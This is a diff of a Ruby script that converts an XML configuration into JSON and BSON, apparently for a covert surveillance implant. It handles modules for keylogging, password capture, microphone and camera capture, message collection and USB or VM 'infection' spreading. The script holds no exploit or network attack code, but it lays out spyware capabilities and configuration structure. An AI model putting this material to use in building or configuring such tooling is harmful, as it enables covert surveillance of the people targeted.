@@ -1,242 +1,450 @@
+#! /usr/bin/env ruby
+
 require 'json'
 require 'bson'
+require 'optparse'
 require 'pp'
 require 'xmlsimple'
 
-def parse_globals(item)
-  globals = {}
-  item.each_pair do |key, value|
-    if key == 'quota' then
-      globals[:quota] = {:min => value.first['mindisk'], :max => value.first['maxlog']}
-      globals[:wipe] = value.first['wipe'] == 'false' ? false : true 
-    end
-    if key == 'template' then
-      globals[:type] = value.first['type']
-    end
-  end
-  globals[:version] = 20111231
-  globals[:nohide] = []
-  return globals
+########################################################################################################
+
+# compatibility function
+
+def trace(level, message)
+  puts message
 end
 
-def parse_events(items)
-  events = []
-  
-  items.each do |i|
-    e = {}
-    e[:start] = i['action'].to_i
-    e[:repeat] = -1
-    e[:end] = -1
-    (i.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
-      e[:event] = ev
-      params = i[ev].first
-      e[:end] = params['endaction'].to_i unless params['endaction'].nil?
-      case ev
-        when 'process'
-          e[:window] = params['window'] == 'false' ? false : true
-          e[:focus] = params['focus'] == 'false' ? false : true
-          e[:process] = params['content']
-        when 'screensaver', 'ac', 'simchange', 'standby'
-          # no parameters
-        when 'connection'
-          e.merge! params
-          e['port'] = e['port'].to_i
-        when 'connectivity'
-          # rename to connection
-          e[:event] = 'connection'
-        when 'winevent'
-          e.merge! params
-          e['id'] = e['id'].to_i
-        when 'battery'
-          e[:min] = params['min'].to_i
-          e[:max] = params['max'].to_i
-        when 'call'
-          e[:number] = params['number']
-        when 'quota'
-          e[:quota] = params['size'].to_i
-        when 'location'
-          e[:type] = params['type']
-          e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
-          e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
-          e[:distance] = params['distance'].to_i unless params['distance'].nil?
-          e[:id] = params['id'].to_i unless params['id'].nil?
-          e[:country] = params['country'].to_i unless params['country'].nil?
-          e[:network] = params['network'].to_i unless params['network'].nil?
-          e[:area] = params['area'].to_i unless params['area'].nil?
-        when 'timer'
-          e[:type] = params['type']
-          case e[:type]
-            when 'date'
-              e[:date] = params['content']
-            when 'daily'
-              e[:hour_from] = params['hour'].first.to_i
-              e[:minute_from] = params['minute'].first.to_i
-              e[:second_from] = params['second'].first.to_i
-              e[:hour_to] = params['endhour'].first.to_i
-              e[:minute_to] = params['endminute'].first.to_i
-              e[:second_to] = params['endsecond'].first.to_i
-            when 'loop', 'after startup'
-              e[:hour] = params['hour'].first.to_i
-              e[:minute] = params['minute'].first.to_i
-              e[:second] = params['second'].first.to_i    
-            when 'after install'
-              e[:days] = params['day'].first.to_i
+########################################################################################################
+
+    def parse_globals(items)
+      globals = {}
+      items.each_pair do |key, value|
+        if key == 'quota' then
+          globals[:quota] = {:min => value.first['mindisk'].to_i*1024*1024, :max => value.first['maxlog'].to_i*1024*1024}
+          globals[:wipe] = value.first['wipe'] == 'false' ? false : true
+        end
+        if key == 'template' then
+          globals[:type] = value.first['type']
+        end
+      end
+      globals[:migrated] = true
+      globals[:version] = 20111231
+      globals[:nohide] = []
+
+      return globals
+    end
+
+    def parse_events(items)
+      events = []
+
+      return events if items.nil?
+
+      items.each do |item|
+        e = {}
+        e[:start] = item['action'].to_i unless item['action'].to_i == -1
+        e[:enabled] = true
+        #e[:repeat] = -1
+        #e[:end] = -1
+        (item.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
+          e[:event] = ev
+          e[:desc] = ev
+          params = item[ev].first
+          e[:end] = params['endaction'].to_i unless params['endaction'].nil? or params['endaction'].to_i == -1
+          case ev
+            when 'process'
+              e[:window] = params['window'] == 'false' ? false : true
+              e[:focus] = params['focus'] == 'false' ? false : true
+              e[:process] = params['content']
+            when 'simchange', 'ac', 'standby', 'screensaver'
+              # no parameters
+            when 'connection'
+              e.merge! params
+              e['port'] = e['port'].to_i
+            when 'connectivity'
+              # rename to connection
+              e[:event] = 'connection'
+            when 'winevent'
+              e.merge! params
+              e['id'] = e['id'].to_i
+            when 'battery'
+              e[:min] = params['min'].to_i
+              e[:max] = params['max'].to_i
+            when 'call'
+              e[:number] = params['number']
+            when 'quota'
+              e[:quota] = params['size'].to_i*1024*1024
+            when 'location'
+              e[:event] = 'position'
+              e[:type] = params['type']
+              e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
+              e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
+              e[:distance] = params['distance'].to_i unless params['distance'].nil?
+              e[:id] = params['id'].to_i unless params['id'].nil?
+              e[:country] = params['country'].to_i unless params['country'].nil?
+              e[:network] = params['network'].to_i unless params['network'].nil?
+              e[:area] = params['area'].to_i unless params['area'].nil?
+            when 'sms'
+              e[:number] = params['number']
+              e[:text] = params['text']
+            when 'timer'
+              case params['type']
+                when 'date'
+                  e[:event] = 'date'
+                  e[:datefrom] = params['content']
+                when 'daily'
+                  e[:ts] = "%02d:%02d:%02d" % [params['hour'].first.to_i, params['minute'].first.to_i, params['second'].first.to_i]
+                  e[:te] = "%02d:%02d:%02d" % [params['endhour'].first.to_i, params['endminute'].first.to_i, params['endsecond'].first.to_i]
+                when 'loop'
+                  e[:event] = 'timer'
+                  e[:ts] = "00:00:00"
+                  e[:te] = "23:59:59"
+                  e[:repeat] = e[:start]
+                  e[:delay] = params['hour'].first.to_i * 3600 + params['minute'].first.to_i * 60 + params['second'].first.to_i
+                when 'after startup'
+                  e[:event] = 'timer'
+                  e[:ts] = "00:00:00"
+                  e[:te] = "23:59:59"
+                when 'after install'
+                  e[:event] = 'afterinst'
+                  e[:days] = params['day'].first.to_i
+              end
+            else
+              raise 'unknown event: ' + ev
           end
-        when 'sms'
-          e[:number] = params['number']
-          e[:text] = params['text']
-        else
-          raise 'unknown event'
+        end
+        events << e
       end
-    end
-    events << e
-  end
-  
-  return events
-end
 
-def parse_actions(items)
-  actions = []
-  
-  items.each do |i|
-    a = {}
-    a[:desc] = i['description']
-    a[:subactions] = []
-    # each subaction
-    (i.keys.delete_if {|x| x == 'number' or x == 'description'}).each do |sub|
-      i[sub].each do |s|
-        
-        subaction = {:action => sub}
-      
-        case sub
-          when 'synchronize'
-            subaction[:stop] = false
-            subaction['type'] = 'internet' if s['type'].nil?
-            subaction.merge! s
-          when 'sms'
-            subaction.merge! s
-          when 'log'
-            subaction[:text] = s
-          when 'execute'
-            subaction[:command] = s
-          when 'uninstall'
+      return events
+    end
+
+    def parse_actions(items)
+      actions = []
+
+      return actions if items.nil?
+
+      items.each do |item|
+        a = {}
+        a[:desc] = item['description']
+        a[:subactions] = []
+        # each subaction
+        (item.keys.delete_if {|x| x == 'number' or x == 'description'}).each do |sub|
+          item[sub].each do |s|
+
+            subaction = {:action => sub}
+
+            case sub
+              when 'synchronize'
+                subaction[:stop] = false
+                # bluetooth does not exist anymore
+                next if s['type'] == 'bluetooth'
+                subaction.merge! s
+                subaction.delete('type')
+                subaction.delete('gprs')
+                subaction['wifi'] = false unless s.has_key?('wifi')
+                subaction['wifi'] = s['wifi'] == 'true' ? true : false
+                subaction['cell'] = s['gprs'] == 'true' ? true : false
+                if s.has_key?('apn')
+                  subaction['cell'] = true
+                  subaction['apn'] = subaction['apn'].first
+                end
+                subaction['bandwidth'] = subaction['bandwidth'].to_i * 1024 unless subaction['bandwidth'].nil?
+                subaction['mindelay'] = subaction['mindelay'].to_i unless subaction['mindelay'].nil?
+                subaction['maxdelay'] = subaction['maxdelay'].to_i unless subaction['maxdelay'].nil?
+              when 'sms'
+                subaction.merge! s
+              when 'log'
+                subaction[:text] = s
+              when 'execute'
+                subaction[:command] = s
+              when 'uninstall'
+                # no parameters
+              when 'agent'
+                subaction[:action] = 'module'
+                subaction[:status] = s['action']
+                subaction[:module] = s['name']
+              else
+                raise "unknown subaction: " + sub
+            end
+            a[:subactions] << subaction
+          end
+        end
+        actions << a
+      end
+
+      return actions
+    end
+
+    def parse_agents(items)
+      modules = []
+
+      return modules if items.nil?
+
+      items.each do |item|
+        a = {}
+        a[:module] = (item.keys.delete_if {|x| x == 'enabled'}).first
+        a[:enabled] = item['enabled'] == 'false' ? false : true
+        case a[:module]
+          when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'calllist', 'url'
             # no parameters
-          when 'agent'
-            subaction[:status] = s['action']
-            subaction[:agent] = s['name']
+          when 'call'
+            a.merge! item[a[:module]].first
+            a['buffer'] = a['buffer'].to_i * 1024
+            a['compression'] = a['compression'].to_i
+          when 'camera'
+            a.merge! item[a[:module]].first
+            a['quality'] = 'med'
+            a[:_ena] = a[:enabled]
+          when 'conference', 'livemic'
+            a.merge! item[a[:module]].first
+          when 'print'
+            a.merge! item[a[:module]].first
+            a.delete('scale')
+            a['quality'] = 'med'
+          when 'mouse'
+            a.merge! item[a[:module]].first
+            a['width'] = a['width'].to_i
+            a['height'] = a['height'].to_i
+          when 'snapshot'
+            a.merge! item[a[:module]].first
+            a['onlywindow'] = a['onlywindow'] == 'true' ? true : false
+            a['quality'] = 'med'
+            a[:_ena] = a[:enabled]
+          when 'mic'
+            a.merge! item[a[:module]].first
+            a['autosense'] = a['autosense'] == 'true' ? true : false
+            a['vad'] = a['vad'] == 'true' ? true : false
+            a['silence'] = a['silence'].to_i
+            a['vadthreshold'] = a['vadthreshold'].to_i
+            a['threshold'] = a['threshold'].to_f
+          when 'position'
+            a.merge! item[a[:module]].first
+            a['gps'] = a['gps'] == 'true' ? true : false
+            a['wifi'] = a['wifi'] == 'true' ? true : false
+            a['cell'] = a['cell'] == 'true' ? true : false
+            a[:_ena] = a[:enabled]
+          when 'crisis'
+            t = item[a[:module]].first
+            a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true,
+                           :processes => t['network'].first['process']} unless t['network'].nil?
+            a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true,
+                        :processes => t['hook'].first['process']} unless t['hook'].nil?
+            a[:synchronize] = t['synchronize'] == 'false' ? false : true unless t['synchronize'].nil?
+            a[:call] = t['call'] == 'false' ? false : true unless t['call'].nil?
+            a[:mic] = t['mic'] == 'false' ? false : true unless t['mic'].nil?
+            a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
+            a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
+          when 'infection'
+            t = item[a[:module]].first
+            a[:local] = t['local'] == 'false' ? false : true
+            a[:usb] = t['usb'] == 'false' ? false : true
+            a[:vm] = t['vm'].to_i
+            # false by default on purpose
+            a[:mobile] = false
+          when 'file'
+            a.merge! item[a[:module]].first
+            a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
+            a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
+            a['open'] = a['open'] == 'true' ? true : false
+            a['capture'] = a['capture'] == 'true' ? true : false
+            a['minsize'] = a['minsize'].to_i unless a['minsize'].nil?
+            a['maxsize'] = a['maxsize'].to_i unless a['maxsize'].nil?
+          when 'messages'
+            item[a[:module]].each do |mes|
+              a.merge! mes
+            end
+            unless a['sms'].nil?
+              a['sms'] = a['sms'].first
+              a['sms']['enabled'] = a['sms']['enabled'] == 'true' ? true : false
+              a['sms']['filter'] = a['sms']['filter'].first
+              a['sms']['filter']['history'] = a['sms']['filter']['history'] == 'true' ? true : false
+            end
+            unless a['mms'].nil?
+              a['mms'] = a['mms'].first
+              a['mms']['enabled'] = a['mms']['enabled'] == 'true' ? true : false
+              a['mms']['filter'] = a['mms']['filter'].first
+              a['mms']['filter']['history'] = a['mms']['filter']['history'] == 'true' ? true : false
+            end
+            unless a['mail'].nil?
+              a['mail'] = a['mail'].first
+              a['mail']['enabled'] = a['mail']['enabled'] == 'true' ? true : false
+              a['mail']['filter'] = a['mail']['filter'].first
+              a['mail']['filter']['history'] = a['mail']['filter']['history'] == 'true' ? true : false
+              a['mail']['filter']['maxsize'] = a['mail']['filter']['maxsize'].to_i * 1024 unless a['mail']['filter']['maxsize'].nil?
+            end
+
+          when 'organizer'
+            # we need to split this agent in two
+            a[:module] = 'addressbook'
+            modules << a.dup
+            a[:module] = 'calendar'
           else
-            raise "unknown subaction"
+            raise "unknown agent: " + a[:module]
         end
-        a[:subactions] << subaction
+        modules << a
+      end
+
+      return modules
+    end
+
+    def agents_on_startup(modules, actions, events)
+
+      subactions = []
+          
+      modules.each do |m|
+        if m[:enabled] and not ['snapshot', 'camera', 'location'].include? m[:module]
+          subactions << {:action => 'module', :status => 'start', :module => m[:module]}
+        end
+        m.delete(:enabled)
+      end
+
+      start_action = {:desc => 'STARTUP', :_mig => true, :subactions => subactions}
+
+      actions << start_action
+
+      event = {:event => 'timer', :desc => 'On Startup', :enabled => true,
+               :ts => '00:00:00', :te => '23:59:59',
+               :start => actions.size - 1}
+
+      events << event
+    end
+
+    def agents_with_repetition(modules, actions, events)
+      modules.each do |m|
+        if m.has_key?('interval')
+          action = {:desc => "#{m[:module]} iteration", :_mig => true, :subactions => [{:action => 'module', :status => 'start', :module => m[:module]}] }
+          actions << action
+          event = {:event => 'timer', :_mig => true, :desc => "#{m[:module]} loop", :enabled => m[:_ena],
+                   :ts => '00:00:00', :te => '23:59:59',
+                   :repeat => actions.size - 1, :delay => m['interval'].to_i}
+          m.delete(:_ena)
+          if m.has_key?('iterations')
+            event[:iter] = m['iterations'].to_i
+            m.delete('iterations')
+          end
+          events << event
+          m.delete('interval')
+          if m[:module] == 'snapshot'
+            if m['newwindow'] == 'true'
+              event = {:event => 'window', :desc => "new win #{m[:module]}", :enabled => true, :start => actions.size - 1}
+              events << event
+            end
+            m.delete('newwindow')
+          end
+        end
       end
     end
-    actions << a
-  end
-  
-  return actions
-end
 
-def parse_agents(items)
-  agents = []
-
-  items.each do |i|
-    a = {}
-    a[:agent] = (i.keys.delete_if {|x| x == 'enabled'}).first
-    a[:enabled] = i['enabled'] == 'false' ? false : true
-    case a[:agent]
-      when 'application', 'chat', 'clipboard', 'keylog', 'organizer', 'password', 'calllist'
-        # no parameters
-      when 'call', 'device', 'camera', 'mic', 'mouse', 'position', 'print', 'url', 'snapshot', 'conference', 'livemic'
-        a.merge! i[a[:agent]].first
-      when 'crisis'
-        t = i[a[:agent]].first
-        a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true, 
-                       :processes => t['network'].first['process']} unless a[:network].nil?
-        a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true, 
-                    :processes => t['hook'].first['process']} unless a[:hook].nil?
-        a[:synchronize] = t['synchronize'] == 'false' ? false : true unless t['synchronize'].nil?
-        a[:call] = t['call'] == 'false' ? false : true unless t['call'].nil?
-        a[:mic] = t['mic'] == 'false' ? false : true unless t['mic'].nil?
-        a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
-        a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
-      when 'infection'
-        t = i[a[:agent]].first 
-        a[:local] = t['local'] == 'false' ? false : true
-        a[:usb] = t['usb'] == 'false' ? false : true
-        # false by default on purpose
-        a[:mobile] = false
-      when 'file'
-        a.merge! i[a[:agent]].first
-        a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
-        a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
-      when 'messages'
-        i[a[:agent]].each do |mes|
-          a.merge! mes
+    def actions_with_start_stop(modules, actions, events)
+      actions.each do |a|
+        # skip actions created during migration
+        next if a[:_mig]
+        # search for start action for camera, snapshot and position
+        # and transform the start/stop action into an enable/disable event
+        a[:subactions].each do |s|
+          if s[:action] == 'module' and ['camera','snapshot', 'position'].include? s[:module]
+            s[:action] = 'event'
+            s[:event] = events.index {|e| e[:desc] == "#{s[:module]} loop" and e[:_mig] }
+            s[:status] = s[:status] == 'start' ? 'enabled' : 'disabled'
+            s.delete :module
+          end
         end
-        a['sms'] = a['sms'].first unless a['sms'].nil?
-        a['mms'] = a['mms'].first unless a['mms'].nil?
-        a['mail'] = a['mail'].first unless a['mail'].nil?
-      else
-        raise "unknown agent"
+      end
     end
-    agents << a 
+
+    def xml_to_json(content)
+
+      modules = []
+      actions = []
+      events = []
+      globals = {}
+
+      begin
+        xml_config = XmlSimple.xml_in(content)
+
+        xml_config.each do |section|
+          case section[0]
+            when 'globals'
+              globals = parse_globals(section[1].first)
+            when 'events'
+              events = parse_events(section[1].first['event'])
+            when 'actions'
+              actions = parse_actions(section[1].first['action'])
+            when 'agents'
+              modules = parse_agents(section[1].first['agent'])
+          end
+        end
+      rescue Exception => e
+        trace :warn, "Invalid config parsing: " + e.message
+        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+      end
+
+      agents_on_startup(modules, actions, events)
+      agents_with_repetition(modules, actions, events)
+      actions_with_start_stop(modules, actions, events)
+
+      config = {'modules' => modules, 'actions' => actions, 'events' => events, 'globals' => globals}
+
+      return config.to_json
+    end
+
+
+#########################################################################
+
+# This hash will hold all of the options parsed from the command-line by OptionParser.
+options = {}
+
+optparse = OptionParser.new do |opts|
+  # Set a banner, displayed at the top of the help screen.
+  opts.banner = "Usage: xml_to_bson [options]"
+
+  opts.separator ""
+  opts.on( '-x', '--xml FILE', String, 'INPUT xml file' ) do |file|
+    options[:xml] = file
   end
-
-  return agents
-end
-
-xml_config = ''
-agents = []
-actions = []
-events = []
-globals = {}
-
-#File.open('config_desktop.xml', 'rb') do |f|
-File.open('config_mobile.xml', 'rb') do |f|
-  xml_config = f.read
-end
-
-data = XmlSimple.xml_in(xml_config)
-
-data.each do |item|
-  case item[0]
-    when 'globals'
-      globals = parse_globals(item[1].first)
-    when 'events'
-      events = parse_events(item[1].first['event'])
-    when 'actions'
-      actions = parse_actions(item[1].first['action'])
-    when 'agents'
-      agents = parse_agents(item[1].first['agent'])      
+  opts.on( '-j', '--json FILE', String, 'OUTPUT json file' ) do |file|
+    options[:json] = file
+  end
+  opts.on( '-b', '--bson FILE', String, 'OUTPUT bson file' ) do |file|
+    options[:bson] = file
+  end
+  opts.separator ""
+  opts.on( '-v', '--verbose', 'verbose mode' ) do
+    options[:verbose] = true
+  end
+  opts.on( '-h', '--help', 'Display this screen' ) do
+    puts opts
+    exit
   end
 end
 
+optparse.parse(ARGV)
 
-config = {'agents' => agents, 'actions' => actions, 'events' => events, 'globals' => globals}
+content = ''
 
-puts 
-puts
-puts "CONFIG: "
-pp config
+File.open(options[:xml], 'rb') { |f| content = f.read }
 
-jconfig = config.to_json
-
-File.open('./config.json', 'wb') do |f|
-  f.write jconfig
-end
-
-#puts "\nJSON CONFIG: "
-#pp jconfig
-
-
+json_config = xml_to_json(content)
+config = JSON.parse(json_config)
 bconfig = BSON.serialize(config)
 
-File.open('./config.bson', 'wb') do |f|
-  f.write bconfig
+if options[:verbose]
+  puts "JSON CONFIG: "
+  pp config
 end
 
-puts "\n\nBSON CONFIG: [#{bconfig.size}]"
+if options[:json]
+  File.open(options[:json], 'wb+') { |f| f.write json_config }
+  puts "\nJSON CONFIG SIZE: #{json_config.size}"
+end
+
+if options[:bson]
+  File.open(options[:bson], 'wb+') { |f| f.write bconfig }
+  puts "\nBSON CONFIG SIZE: #{bconfig.size}"
+end
+
+
 #bconfig.to_a.each do |c|
 #  print "%02X" % c
 #end
-puts 
+
